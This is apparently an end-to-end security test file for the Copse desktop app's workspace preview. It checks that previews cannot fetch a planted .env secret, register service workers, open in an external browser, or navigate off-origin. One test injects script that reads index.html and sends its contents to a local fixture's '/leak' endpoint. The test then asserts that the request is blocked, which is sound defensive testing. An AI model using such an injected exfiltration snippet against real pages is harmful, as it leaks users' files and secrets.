import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { WebviewTag } from 'electron'
import { $, $$, browser, expect } from '@wdio/globals'
import {
  resetUserData,
  seedE2eViewport,
  seedEmptyProject,
  writeSettings,
} from './helpers/seed-config.ts'
import { E2E_THREE_PANE_VIEWPORT, saveAppScreenshot } from './helpers/screenshot.ts'
import { startBrowserPageFixture } from './helpers/browser-page-fixture.ts'
import { removeE2eTree } from './helpers/remove-tree.ts'

describe('workspace preview security', () => {
  let workspaceRoot = ''
  let egress: Awaited<ReturnType<typeof startBrowserPageFixture>> | null = null

  before(async () => {
    workspaceRoot = mkdtempSync(join(tmpdir(), 'copse-preview-security-'))
    mkdirSync(join(workspaceRoot, 'assets'))
    writeFileSync(
      join(workspaceRoot, 'index.html'),
      '<!doctype html><html><head><title>Workspace preview</title></head>' +
        '<body><h1>Workspace preview</h1><p>Local page</p>' +
        '<script src="/assets/app.js"></script></body></html>',
    )
    writeFileSync(
      join(workspaceRoot, 'assets', 'app.js'),
      'document.documentElement.dataset.previewAsset = "loaded"',
    )
    writeFileSync(join(workspaceRoot, '.env'), 'COPSE_PREVIEW_SECRET=never-serve-this')
    egress = await startBrowserPageFixture(43131)
    resetUserData()
    seedE2eViewport(E2E_THREE_PANE_VIEWPORT)
    seedEmptyProject(workspaceRoot, 'e2e-workspace-preview-security')
    writeSettings({
      openLinksInBuiltInBrowser: false,
      layout: { projectsPaneWidth: 260, filesPaneWidth: 680, fileTreeWidth: 200 },
    })
    await browser.reloadSession()
    await $('.prompt-input').waitForExist({ timeout: 30_000 })
  })

  after(async () => {
    resetUserData()
    if (workspaceRoot) removeE2eTree(workspaceRoot)
    await egress?.close()
  })

  it('keeps a workspace HTML page inside Copse and refuses its secret-file request', async () => {
    const panelButton = await $('.titlebar-btn[aria-label="Toggle right panel"]').getElement()
    if (!(await $('#pane-files').isDisplayed())) await panelButton.click()
    await $('#pane-files').waitForDisplayed({ timeout: 5_000 })

    const row = await $('.tree-row[title="index.html"]').getElement()
    await row.waitForDisplayed({ timeout: 30_000 })
    await row.click({ button: 'right' })
    const open = await $('.context-menu-item').getElement()
    await expect(open).toHaveText('Open in browser')
    await open.click()

    const address = await $('.browser-tab-panel.is-active .browser-url-input').getElement()
    await address.waitForDisplayed({ timeout: 15_000 })
    await browser.waitUntil(
      async () => (await address.getValue()).startsWith('http://localhost:'),
      {
        timeout: 15_000,
        timeoutMsg: 'expected the workspace page in the built-in browser',
      },
    )
    await browser.waitUntil(
      () =>
        browser.execute(() => {
          const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
          return (
            webview?.getURL().startsWith('http://localhost:') &&
            !webview.isLoading() &&
            webview.getTitle() === 'Workspace preview'
          )
        }),
      { timeout: 25_000, timeoutMsg: 'expected the workspace preview to finish loading' },
    )

    const guestResult: unknown = await browser.execute(async () => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      if (!webview) throw new Error('Workspace preview webview missing')
      const result: unknown = await webview.executeJavaScript(
        "Promise.all([document.querySelector('h1')?.textContent, document.documentElement.dataset.previewAsset, fetch('/.env').then((response) => response.status), location.search, navigator.serviceWorker?.register('/assets/app.js').then(() => 'registered', (error) => error.name) ?? 'unavailable'])",
      )
      return result
    })
    expect(guestResult).toEqual(['Workspace preview', 'loaded', 404, '', 'SecurityError'])
    expect(await address.getValue()).not.toContain('__copse_preview')
    // The listener chooses a random port. Pin only the displayed address for
    // the reference capture after verifying the real URL and page contents.
    const previewAddress = await address.getValue()
    await browser.execute(() => {
      const input = document.querySelector<HTMLInputElement>(
        '.browser-tab-panel.is-active .browser-url-input',
      )
      if (input) {
        input.value = 'http://localhost:4321/index.html'
        input.blur()
      }
    })
    try {
      await saveAppScreenshot('workspace-preview-protected.png', E2E_THREE_PANE_VIEWPORT)
    } finally {
      await browser.execute((url) => {
        const input = document.querySelector<HTMLInputElement>(
          '.browser-tab-panel.is-active .browser-url-input',
        )
        if (input) input.value = url
      }, previewAddress)
    }
  })

  it('blocks a workspace page from navigating off-origin with file contents', async () => {
    if (!egress) throw new Error('Egress fixture missing')
    const originalAddress = await $('.browser-tab-panel.is-active .browser-url-input').getValue()
    const target = `${egress.origin}/leak?source=`
    await browser.execute(async (targetUrl) => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      if (!webview) throw new Error('Workspace preview webview missing')
      const result: unknown = await webview.executeJavaScript(
        `(async () => { const source = await fetch('/index.html').then((response) => response.text()); location.href = ${JSON.stringify(targetUrl)} + encodeURIComponent(source); return source.length; })()`,
      )
      return result
    }, target)
    // A page navigation is asynchronous. Observe it for a bounded window so
    // a delayed request or a changed guest address cannot slip past the check.
    const deadline = Date.now() + 500
    while (Date.now() < deadline && egress.requests.length === 0) {
      const guestAddress = await browser.execute(() => {
        const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
        return webview?.getURL()
      })
      expect(guestAddress).toBe(originalAddress)
      await browser.pause(25)
    }
    expect(egress.requests).toEqual([])
    const guestAddress = await browser.execute(() => {
      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
      return webview?.getURL()
    })
    expect(guestAddress).toBe(originalAddress)
  })

  it('explains why a workspace preview cannot open in the default browser', async () => {
    const menu = await $('.browser-tab-panel.is-active .browser-menu-btn').getElement()
    await menu.click()
    const items = await $$('.browser-tab-panel.is-active .browser-menu-item').getElements()
    const external = items[5]
    expect(external).toBeDefined()
    if (!external) throw new Error('Open in default browser menu item missing')
    await expect(external).toHaveText('Open in default browser')
    await expect(external).toBeEnabled()
    await external.click()
    const toast = await $('.toast=Workspace previews can only open inside Copse.').getElement()
    await toast.waitForDisplayed({ timeout: 5_000 })
    const address = await $('.browser-tab-panel.is-active .browser-url-input').getElement()
    const previewAddress = await address.getValue()
    expect(previewAddress).toMatch(/^http:\/\/localhost:\d+\//)
    await browser.execute(() => {
      const input = document.querySelector<HTMLInputElement>(
        '.browser-tab-panel.is-active .browser-url-input',
      )
      if (input) input.value = 'http://localhost:4321/index.html'
    })
    try {
      await saveAppScreenshot('workspace-preview-external-explained.png', E2E_THREE_PANE_VIEWPORT)
    } finally {
      await browser.execute((url) => {
        const input = document.querySelector<HTMLInputElement>(
          '.browser-tab-panel.is-active .browser-url-input',
        )
        if (input) input.value = url
      }, previewAddress)
    }
  })
})
